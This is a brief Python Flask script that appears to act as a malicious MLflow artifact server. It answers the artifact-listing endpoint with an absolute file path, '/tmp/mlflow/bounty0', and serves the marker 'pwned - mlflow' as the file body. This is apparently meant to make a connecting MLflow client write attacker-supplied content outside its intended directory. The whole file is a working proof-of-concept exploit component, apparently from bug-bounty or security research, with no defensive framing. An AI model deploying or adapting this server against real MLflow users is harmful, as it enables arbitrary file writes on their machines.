from flask import Flask, jsonify

app = Flask(__name__)
app.config["DEBUG"] = True
content = "pwned - mlflow"

@app.errorhandler(404)
def page_not_found(e):
    return content

@app.route("/api/2.0/mlflow-artifacts/artifacts")
def index():
    return jsonify({
        "files": [
            {
                "path": "/tmp/mlflow/bounty0",
                "is_dir": False,
                "file_size": len(content)
            }
        ]
    })

app.run(host="0.0.0.0", port=4444)